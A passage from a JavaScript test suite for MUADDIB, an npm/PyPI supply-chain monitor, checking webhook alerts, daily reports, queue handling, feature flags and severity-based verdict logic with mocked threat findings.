    const origDate = stats.lastDailyReportDate;
    // Backup the disk report file so it doesn't override our test value
    let backupReport = null;
    try { backupReport = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}

    stats.lastDailyReportDate = '2024-06-15';
    saveState({ npmLastPackage: 'restore-test', pypiLastPackage: '' });
    stats.lastDailyReportDate = null; // clear
    // Also clear the disk report file so loadState uses state file value
    try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
    try {
      const state = loadState();
      assert(stats.lastDailyReportDate === '2024-06-15', 'Should restore lastDailyReportDate from file, got ' + stats.lastDailyReportDate);
      assert(state.npmLastPackage === 'restore-test', 'Should restore npmLastPackage');
    } finally {
      stats.lastDailyReportDate = origDate;
      if (backupReport !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backupReport, 'utf8');
      }
    }
  });

  // --- isDailyReportDue ---

  test('MONITOR: isDailyReportDue returns false when already sent today', () => {
    const origDate = stats.lastDailyReportDate;
    stats.lastDailyReportDate = getParisDateString(); // today
    try {
      assert(isDailyReportDue() === false, 'Should be false when already sent today');
    } finally {
      stats.lastDailyReportDate = origDate;
    }
  });

  // ============================================
  // COVERAGE BOOST TESTS (monkey-patched)
  // ============================================

  console.log('\n=== MONITOR COVERAGE BOOST TESTS ===\n');

  // --- trySendWebhook with mocked webhook (IOC match) ---

  await asyncTest('MONITOR-COV: trySendWebhook attempts send for IOC match', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    const errors = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => errors.push(args.join(' '));

    try {
      alertedPackageRules.clear(); // Prevent dedup from previous tests
      const mockResult = {
        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
        summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
      };
      await trySendWebhook('evil-pkg', '1.0.0', 'npm', mockResult, null);
      // Will either succeed (unlikely) or fail with network error (expected)
      const anyLog = logs.concat(errors).join(' ');
      assert(anyLog.includes('evil-pkg'), 'Should reference the package name');
    } finally {
      console.log = origLog;
      console.error = origErr;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  await asyncTest('MONITOR-COV: trySendWebhook logs suppressed for low-static sandbox clean', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const logs = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = (...args) => logs.push(args.join(' '));

    try {
      // No riskScore → staticScore=0 < 20, sandbox clean → suppressed
      const mockResult = {
        threats: [{ type: 'suspicious_dataflow', severity: 'HIGH' }],
        summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 }
      };
      await trySendWebhook('safe-pkg', '1.0.0', 'npm', mockResult, { score: 0 });
      const suppressedLog = logs.find(l => l.includes('SUPPRESSED'));
      assert(suppressedLog !== undefined, 'Should log SUPPRESSED message');
    } finally {
      console.log = origLog;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  await asyncTest('MONITOR-COV: trySendWebhook attempts send for positive sandbox', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    const errors = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => errors.push(args.join(' '));

    try {
      alertedPackageRules.clear(); // Prevent dedup from previous tests
      const mockResult = {
        threats: [{ type: 'dynamic_require', severity: 'HIGH' }],
        summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 }
      };
      await trySendWebhook('suspect-pkg', '1.0', 'npm', mockResult, { score: 75, severity: 'HIGH' });
      const anyLog = logs.concat(errors).join(' ');
      assert(anyLog.includes('suspect-pkg'), 'Should reference the package name');
    } finally {
      console.log = origLog;
      console.error = origErr;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  await asyncTest('MONITOR-COV: trySendWebhook handles webhook failure gracefully', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const errors = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = () => {};
    console.error = (...args) => errors.push(args.join(' '));

    try {
      alertedPackageRules.clear(); // Prevent dedup from previous tests
      const mockResult = {
        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
        summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
      };
      await trySendWebhook('evil-pkg', '1.0.0', 'npm', mockResult, null);
      // Webhook to fake URL will fail, error should be caught
      const errLog = errors.find(l => l.includes('Webhook failed') || l.includes('evil-pkg'));
      assert(errLog !== undefined, 'Should log webhook failure or reference package');
    } finally {
      console.log = origLog;
      console.error = origErr;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- reportStats test ---

  test('MONITOR-COV: reportStats logs formatted stats with correct values', () => {
    const origLog = console.log;
    const logs = [];
    console.log = (...args) => logs.push(args.join(' '));

    // Save original stats values
    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTime = stats.totalTimeMs;

    stats.scanned = 10;
    stats.clean = 8;
    stats.suspect = 2;
    stats.errors = 0;
    stats.totalTimeMs = 50000;

    try {
      reportStats();
      const statsLog = logs.find(l => l.includes('[MONITOR] Stats:'));
      assert(statsLog !== undefined, 'Should log stats');
      assert(statsLog.includes('10 scanned'), 'Should include scanned count');
      assert(statsLog.includes('8 clean'), 'Should include clean count');
      assert(statsLog.includes('2 suspect'), 'Should include suspect count');
      assert(statsLog.includes('0 errors'), 'Should include error count');
      assert(statsLog.includes('5.0'), 'Should include avg time (50000/10/1000=5.0)');
    } finally {
      console.log = origLog;
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.totalTimeMs = origTime;
    }
  });

  test('MONITOR-COV: reportStats handles zero scanned (no division error)', () => {
    const origLog = console.log;
    const logs = [];
    console.log = (...args) => logs.push(args.join(' '));

    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTime = stats.totalTimeMs;

    stats.scanned = 0;
    stats.clean = 0;
    stats.suspect = 0;
    stats.errors = 0;
    stats.totalTimeMs = 0;

    try {
      reportStats();
      const statsLog = logs.find(l => l.includes('[MONITOR] Stats:'));
      assert(statsLog !== undefined, 'Should log stats even when 0');
      assert(statsLog.includes('0 scanned'), 'Should show 0 scanned');
      assert(statsLog.includes('avg 0.0'), 'Should show avg 0.0 (no div by zero)');
    } finally {
      console.log = origLog;
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.totalTimeMs = origTime;
    }
  });

  test('MONITOR-COV: reportStats pluralizes errors correctly', () => {
    const origLog = console.log;
    const logs = [];
    console.log = (...args) => logs.push(args.join(' '));

    const origScanned = stats.scanned;
    const origErrors = stats.errors;

    stats.scanned = 1;
    stats.errors = 1;

    try {
      reportStats();
      const statsLog = logs.find(l => l.includes('[MONITOR] Stats:'));
      assert(statsLog !== undefined, 'Should log stats');
      // When errors === 1, should not have plural 's'
      assert(statsLog.includes('1 error,') || statsLog.includes('1 error '), 'Should show singular error');
    } finally {
      console.log = origLog;
      stats.scanned = origScanned;
      stats.errors = origErrors;
    }
  });

  // --- cleanupOrphanTmpDirs test ---

  test('MONITOR-COV: cleanupOrphanTmpDirs cleans old directories with files', () => {
    const tmpBase = path.join(os.tmpdir(), 'muaddib-monitor');
    if (!fs.existsSync(tmpBase)) fs.mkdirSync(tmpBase, { recursive: true });

    // Create a fake old directory with nested content
    const oldDir = path.join(tmpBase, 'test-pkg-cleanup-' + Date.now());
    fs.mkdirSync(oldDir, { recursive: true });
    fs.writeFileSync(path.join(oldDir, 'test.txt'), 'test content');
    const subDir = path.join(oldDir, 'subdir');
    fs.mkdirSync(subDir, { recursive: true });
    fs.writeFileSync(path.join(subDir, 'nested.txt'), 'nested');

    const origLog = console.log;
    const logs = [];
    console.log = (...args) => logs.push(args.join(' '));

    try {
      assert(fs.existsSync(oldDir), 'Old dir should exist before cleanup');
      cleanupOrphanTmpDirs();
      assert(!fs.existsSync(oldDir), 'Old dir should be removed after cleanup');
      const cleanupLog = logs.find(l => l.includes('Cleaned up') && l.includes('orphan'));
      assert(cleanupLog !== undefined, 'Should log cleanup message');
    } finally {
      console.log = origLog;
      try { fs.rmSync(oldDir, { recursive: true, force: true }); } catch {}
    }
  });

  // --- sendDailyReport test ---

  await asyncTest('MONITOR-COV: sendDailyReport resets counters when webhook set', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    console.log = () => {};
    console.error = () => {};

    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';

    const webhookModule = require('../../src/webhook.js');
    const origSendWebhook = webhookModule.sendWebhook;
    webhookModule.sendWebhook = async () => {};

    // Save original values
    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTotalTimeMs = stats.totalTimeMs;
    const origDailyLen = dailyAlerts.length;
    const origRecentSize = recentlyScanned.size;
    const origLastDate = stats.lastDailyReportDate;

    // Set some values
    stats.scanned = 5;
    stats.clean = 3;
    stats.suspect = 2;
    stats.errors = 0;
    stats.totalTimeMs = 25000;
    dailyAlerts.push({ name: 'test', version: '1.0', ecosystem: 'npm', findingsCount: 1 });
    recentlyScanned.add('npm/daily-report-test@1.0.0');

    try {
      await sendDailyReport();
      // After sendDailyReport, counters should be reset
      assert(stats.scanned === 0, 'scanned should be reset to 0, got ' + stats.scanned);
      assert(stats.clean === 0, 'clean should be reset to 0, got ' + stats.clean);
      assert(stats.suspect === 0, 'suspect should be reset to 0, got ' + stats.suspect);
      assert(stats.errors === 0, 'errors should be reset to 0');
      assert(stats.totalTimeMs === 0, 'totalTimeMs should be reset to 0');
      assert(dailyAlerts.length === 0, 'dailyAlerts should be cleared');
      assert(recentlyScanned.size === 0, 'recentlyScanned should be cleared');
      assert(stats.lastDailyReportDate === getParisDateString(), 'lastDailyReportDate should be today');
    } finally {
      webhookModule.sendWebhook = origSendWebhook;
      console.log = origLog;
      console.error = origErr;
      // Restore stats
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.totalTimeMs = origTotalTimeMs;
      dailyAlerts.length = 0;
      recentlyScanned.clear();
      stats.lastDailyReportDate = origLastDate;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  await asyncTest('MONITOR-COV: sendDailyReport handles webhook failure gracefully', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const errors = [];
    console.log = () => {};
    console.error = (...args) => errors.push(args.join(' '));

    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';

    const webhookModule = require('../../src/webhook.js');
    const origSendWebhook = webhookModule.sendWebhook;
    webhookModule.sendWebhook = async () => { throw new Error('webhook failure test'); };

    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origLastDate = stats.lastDailyReportDate;

    stats.scanned = 1;

    try {
      await sendDailyReport();
      const errLog = errors.find(l => l.includes('Daily report webhook failed'));
      assert(errLog !== undefined, 'Should log webhook failure');
      // Counters should still be reset even on webhook failure
      assert(stats.scanned === 0, 'scanned should be reset even on failure');
    } finally {
      webhookModule.sendWebhook = origSendWebhook;
      console.log = origLog;
      console.error = origErr;
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.lastDailyReportDate = origLastDate;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- processQueue test ---

  await asyncTest('MONITOR-COV: processQueue processes empty queue without error', async () => {
    // Clear queue
    scanQueue.length = 0;
    await processQueue();
    assert(scanQueue.length === 0, 'Queue should remain empty');
  });

  await asyncTest('MONITOR-COV: processQueue handles errors in resolveTarballAndScan', async () => {
    const origLog = console.log;
    const origErr = console.error;
    const errors = [];
    console.log = () => {};
    console.error = (...args) => errors.push(args.join(' '));

    const origErrors2 = stats.errors;

    // Push an item that will fail (invalid ecosystem/tarball)
    scanQueue.length = 0;
    scanQueue.push({
      name: 'processqueue-test-nonexistent-pkg-' + Date.now(),
      version: '0.0.1',
      ecosystem: 'npm',
      tarballUrl: null
    });

    try {
      await processQueue();
      // processQueue should have caught errors, not thrown
      assert(scanQueue.length === 0, 'Queue should be drained after processing');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.errors = origErrors2;
    }
  });

  // --- runTemporalCheck with disabled features ---

  await asyncTest('MONITOR-COV: runTemporalCheck returns null when all temporal disabled', async () => {
    const origEnvs = {
      temporal: process.env.MUADDIB_MONITOR_TEMPORAL,
      ast: process.env.MUADDIB_MONITOR_TEMPORAL_AST,
      publish: process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH,
      maintainer: process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER
    };
    const origLog = console.log;
    console.log = () => {};

    process.env.MUADDIB_MONITOR_TEMPORAL = 'false';
    process.env.MUADDIB_MONITOR_TEMPORAL_AST = 'false';
    process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = 'false';
    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';

    try {
      const result = await runTemporalCheck('express');
      assert(result === null, 'runTemporalCheck should return null when disabled');

      const astResult = await runTemporalAstCheck('express');
      assert(astResult === null, 'runTemporalAstCheck should return null when disabled');

      const publishResult = await runTemporalPublishCheck('express');
      assert(publishResult === null, 'runTemporalPublishCheck should return null when disabled');

      const maintainerResult = await runTemporalMaintainerCheck('express');
      assert(maintainerResult === null, 'runTemporalMaintainerCheck should return null when disabled');
    } finally {
      console.log = origLog;
      for (const [key, val] of Object.entries(origEnvs)) {
        const envKey = key === 'temporal' ? 'MUADDIB_MONITOR_TEMPORAL'
          : key === 'ast' ? 'MUADDIB_MONITOR_TEMPORAL_AST'
          : key === 'publish' ? 'MUADDIB_MONITOR_TEMPORAL_PUBLISH'
          : 'MUADDIB_MONITOR_TEMPORAL_MAINTAINER';
        if (val !== undefined) process.env[envKey] = val;
        else delete process.env[envKey];
      }
    }
  });

  // --- resolveTarballAndScan extended ---

  await asyncTest('MONITOR-COV: resolveTarballAndScan handles npm package with no tarball', async () => {
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    const errors = [];
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => errors.push(args.join(' '));

    const origErrors2 = stats.errors;

    try {
      // Use a non-existent package name so getNpmLatestTarball fails
      const item = {
        name: 'muaddib-nonexistent-test-pkg-' + Date.now(),
        version: '',
        ecosystem: 'npm',
        tarballUrl: null
      };
      // Clear dedup so it doesn't skip
      recentlyScanned.delete(`npm/${item.name}@`);
      recentlyScanned.delete(`npm/${item.name}@${item.version}`);

      await resolveTarballAndScan(item);
      // Should log error resolving tarball
      const errorLog = errors.find(l => l.includes('ERROR resolving npm tarball'));
      const skipLog = logs.find(l => l.includes('SKIP') && l.includes('no tarball'));
      // Either an error or a skip is expected
      assert(errorLog !== undefined || skipLog !== undefined,
        'Should log error or skip for non-existent npm package');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.errors = origErrors2;
    }
  });

  await asyncTest('MONITOR-COV: resolveTarballAndScan handles pypi package with no tarball', async () => {
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    const errors = [];
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => errors.push(args.join(' '));

    const origErrors2 = stats.errors;

    try {
      const item = {
        name: 'muaddib-nonexistent-pypi-test-' + Date.now(),
        version: '',
        ecosystem: 'pypi',
        tarballUrl: null
      };
      recentlyScanned.delete(`pypi/${item.name}@`);
      recentlyScanned.delete(`pypi/${item.name}@${item.version}`);

      await resolveTarballAndScan(item);
      // Should log error resolving tarball
      const errorLog = errors.find(l => l.includes('ERROR resolving PyPI tarball'));
      const skipLog = logs.find(l => l.includes('SKIP') && l.includes('no tarball'));
      assert(errorLog !== undefined || skipLog !== undefined,
        'Should log error or skip for non-existent PyPI package');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.errors = origErrors2;
    }
  });

  // --- isTemporalMaintainerEnabled ---

  test('MONITOR-COV: isTemporalMaintainerEnabled returns true by default', () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    try {
      assert(isTemporalMaintainerEnabled() === true, 'Should be true by default');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
    }
  });

  test('MONITOR-COV: isTemporalMaintainerEnabled returns false when set to false', () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';
    try {
      assert(isTemporalMaintainerEnabled() === false, 'Should be false when env is false');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    }
  });

  test('MONITOR-COV: isTemporalMaintainerEnabled returns false for FALSE (case insensitive)', () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'FALSE';
    try {
      assert(isTemporalMaintainerEnabled() === false, 'Should be false for uppercase FALSE');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    }
  });

  // --- buildMaintainerChangeWebhookEmbed extended ---

  test('MONITOR-COV: buildMaintainerChangeWebhookEmbed handles MEDIUM severity', () => {
    const embed = buildMaintainerChangeWebhookEmbed({
      packageName: 'medium-pkg',
      findings: [{ type: 'suspicious_maintainer', severity: 'MEDIUM', description: 'Suspicious patterns', riskAssessment: { reasons: [] } }]
    });
    assert(embed.embeds[0].color === 0xf1c40f, 'MEDIUM should be yellow');
  });

  test('MONITOR-COV: buildMaintainerChangeWebhookEmbed handles empty findings', () => {
    const embed = buildMaintainerChangeWebhookEmbed({
      packageName: 'no-findings-pkg',
      findings: []
    });
    assert(embed.embeds, 'Should still have embeds');
    const findingsField = embed.embeds[0].fields.find(f => f.name === 'Findings');
    assert(findingsField.value === 'None', 'Should show None for empty findings');
  });

  // --- buildDailyReportEmbed with daily alerts ---

  test('MONITOR-COV: buildDailyReportEmbed includes daily alert suspects', () => {
    const origLog = console.log;
    console.log = () => {};

    const origScanned = stats.scanned;
    const origSuspect = stats.suspect;
    stats.scanned = 5;
    stats.suspect = 2;

    // Add some daily alerts
    const origLen = dailyAlerts.length;
    dailyAlerts.push({ name: 'suspect-a', version: '1.0', ecosystem: 'npm', findingsCount: 3 });
    dailyAlerts.push({ name: 'suspect-b', version: '2.0', ecosystem: 'pypi', findingsCount: 1 });

    try {
      const embed = buildDailyReportEmbed();
      assert(embed.embeds, 'Should have embeds');
      const e = embed.embeds[0];
      const topField = e.fields.find(f => f.name === 'Top Suspects');
      assert(topField, 'Should have Top Suspects field');
      assertIncludes(topField.value, 'suspect-a', 'Should include first suspect');
    } finally {
      console.log = origLog;
      stats.scanned = origScanned;
      stats.suspect = origSuspect;
      // Remove added alerts
      dailyAlerts.length = origLen;
    }
  });

  // --- trySendWebhook with sandbox data in webhook ---

  await asyncTest('MONITOR-COV: trySendWebhook with sandbox data exercises payload building', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => logs.push(args.join(' '));

    try {
      alertedPackageRules.clear(); // Prevent dedup from previous tests
      const mockResult = {
        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
        summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
      };
      const sandboxResult = { score: 85, severity: 'CRITICAL' };
      await trySendWebhook('evil-pkg', '2.0.0', 'npm', mockResult, sandboxResult);
      // Will attempt webhook and fail (network), but exercises the code path
      const anyLog = logs.join(' ');
      assert(anyLog.includes('evil-pkg'), 'Should reference the package name');
    } finally {
      console.log = origLog;
      console.error = origErr;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- processQueue with timeout ---

  await asyncTest('MONITOR-COV: processQueue handles scan timeout', async () => {
    const origLog = console.log;
    const origErr = console.error;
    const errors = [];
    console.log = () => {};
    console.error = (...args) => errors.push(args.join(' '));

    const origErrors2 = stats.errors;

    // Push an item and verify queue is drained
    scanQueue.length = 0;
    scanQueue.push({
      name: 'timeout-test-pkg-' + Date.now(),
      version: '0.0.1',
      ecosystem: 'npm',
      tarballUrl: null
    });

    try {
      await processQueue();
      assert(scanQueue.length === 0, 'Queue should be drained even with errors');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.errors = origErrors2;
    }
  });

  // --- sendDailyReport with no webhook (early return) ---

  await asyncTest('MONITOR-COV: sendDailyReport persists locally and resets stats even without webhook URL', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    const logs = [];
    const origLog = console.log;
    const origErr = console.error;
    console.log = (msg) => logs.push(msg);
    console.error = () => {};

    // Set stats to non-zero to verify they ARE reset (persist + reset even without webhook)
    const origScanned = stats.scanned;
    stats.scanned = 42;

    try {
      await sendDailyReport();
      // sendDailyReport now persists locally and resets counters even without webhook
      assert(stats.scanned === 0, 'Stats should be reset after daily report (no webhook still persists)');
      const noWebhookLog = logs.some(l => typeof l === 'string' && l.includes('no webhook URL configured'));
      assert(noWebhookLog, 'Should log that no webhook URL is configured');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.scanned = origScanned;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
    }
  });

  // --- isTemporalEnabled extended ---

  test('MONITOR-COV: isTemporalEnabled returns true by default', () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL;
    delete process.env.MUADDIB_MONITOR_TEMPORAL;
    try {
      assert(isTemporalEnabled() === true, 'Should be true by default');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL = origEnv;
    }
  });

  // --- isTemporalAstEnabled extended ---

  test('MONITOR-COV: isTemporalAstEnabled returns true by default', () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    try {
      assert(isTemporalAstEnabled() === true, 'Should be true by default');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_AST = origEnv;
    }
  });

  // --- isTemporalPublishEnabled extended ---

  test('MONITOR-COV: isTemporalPublishEnabled returns true by default', () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    try {
      assert(isTemporalPublishEnabled() === true, 'Should be true by default');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = origEnv;
    }
  });

  // --- isCanaryEnabled extended ---

  test('MONITOR-COV: isCanaryEnabled returns true by default', () => {
    const origEnv = process.env.MUADDIB_MONITOR_CANARY;
    delete process.env.MUADDIB_MONITOR_CANARY;
    try {
      assert(isCanaryEnabled() === true, 'Should be true by default');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_CANARY = origEnv;
    }
  });

  test('MONITOR-COV: isCanaryEnabled returns false when disabled', () => {
    const origEnv = process.env.MUADDIB_MONITOR_CANARY;
    process.env.MUADDIB_MONITOR_CANARY = 'false';
    try {
      assert(isCanaryEnabled() === false, 'Should be false when env is false');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_CANARY = origEnv;
      else delete process.env.MUADDIB_MONITOR_CANARY;
    }
  });

  // --- isSandboxEnabled extended ---

  test('MONITOR-COV: isSandboxEnabled returns true by default', () => {
    const origEnv = process.env.MUADDIB_MONITOR_SANDBOX;
    delete process.env.MUADDIB_MONITOR_SANDBOX;
    try {
      assert(isSandboxEnabled() === true, 'Should be true by default');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = origEnv;
    }
  });

  test('MONITOR-COV: isSandboxEnabled returns false when disabled', () => {
    const origEnv = process.env.MUADDIB_MONITOR_SANDBOX;
    process.env.MUADDIB_MONITOR_SANDBOX = 'false';
    try {
      assert(isSandboxEnabled() === false, 'Should be false when env is false');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = origEnv;
      else delete process.env.MUADDIB_MONITOR_SANDBOX;
    }
  });

  // --- getWebhookUrl extended ---

  test('MONITOR-COV: getWebhookUrl returns url when set', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const url = getWebhookUrl();
      assert(url === 'https://hooks.example.com/test', 'Should return the URL');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR-COV: getWebhookUrl returns null when not set', () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    try {
      const url = getWebhookUrl();
      assert(url === null || url === undefined || url === '', 'Should return falsy when not set');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
    }
  });

  // ============================================
  // SANDWORM_MODE FIX: TEMPORAL CRITICAL/HIGH PRESERVED DESPITE STATIC CLEAN
  // ============================================

  console.log('\n=== SANDWORM_MODE FIX TESTS ===\n');

  test('MONITOR: temporal CRITICAL + static clean → verdict is SUSPECT not FALSE POSITIVE', () => {
    // Simulate the decision logic from resolveTarballAndScan
    const temporalResult = { suspicious: true, findings: [{ severity: 'CRITICAL', type: 'lifecycle_added', script: 'postinstall' }] };
    const staticClean = true;
    const sandboxResult = null;

    const temporalMaxSev = getTemporalMaxSeverity(temporalResult, null, null, null);
    const isSuspect = (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH');

    assert(isSuspect === true, 'Temporal CRITICAL + static clean should be SUSPECT');
    assert(temporalMaxSev === 'CRITICAL', 'Max severity should be CRITICAL');
  });

  test('MONITOR: temporal HIGH + static clean → verdict is SUSPECT not FALSE POSITIVE', () => {
    const astResult = { suspicious: true, findings: [{ severity: 'HIGH', pattern: 'child_process' }] };
    const temporalMaxSev = getTemporalMaxSeverity(null, astResult, null, null);
    const isSuspect = (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH');

    assert(isSuspect === true, 'Temporal HIGH + static clean should be SUSPECT');
    assert(temporalMaxSev === 'HIGH', 'Max severity should be HIGH');
  });

  test('MONITOR: publish_burst HIGH alone + static clean → FALSE POSITIVE (not SUSPECT)', () => {
    // This is the core fix: nightly builds (nuxt, opencode, pine-ds, adguard) with
    // publish_burst HIGH but clean static scan should NOT be marked SUSPECT.
    // publishResult is excluded from getTemporalMaxSeverity() — handled by isPublishAnomalyOnly().
    const publishResult = { suspicious: true, anomalies: [{ severity: 'HIGH', type: 'publish_burst' }] };
    const temporalMaxSev = getTemporalMaxSeverity(null, null, publishResult, null);
    const isSuspect = (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH');

    assert(temporalMaxSev === null, 'publish_burst HIGH should be excluded from severity calc');
    assert(isSuspect === false, 'publish_burst HIGH alone + static clean must be FALSE POSITIVE, not SUSPECT');
    assert(isPublishAnomalyOnly(null, null, publishResult, null) === true,
      'publish_burst alone should be caught by isPublishAnomalyOnly');
  });

  test('MONITOR: temporal LOW + static clean → verdict remains FALSE POSITIVE', () => {
    const maintainerResult = { suspicious: true, findings: [{ severity: 'LOW' }] };
    const temporalMaxSev = getTemporalMaxSeverity(null, null, null, maintainerResult);
    const isSuspect = (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH');

    assert(isSuspect === false, 'Temporal LOW + static clean should remain FALSE POSITIVE');
  });

  test('MONITOR: mixed temporal (MEDIUM lifecycle + CRITICAL AST) + static clean → SUSPECT', () => {
    const temporal = { suspicious: true, findings: [{ severity: 'MEDIUM' }] };
    const ast = { suspicious: true, findings: [{ severity: 'CRITICAL', pattern: 'eval' }] };
    const temporalMaxSev = getTemporalMaxSeverity(temporal, ast, null, null);
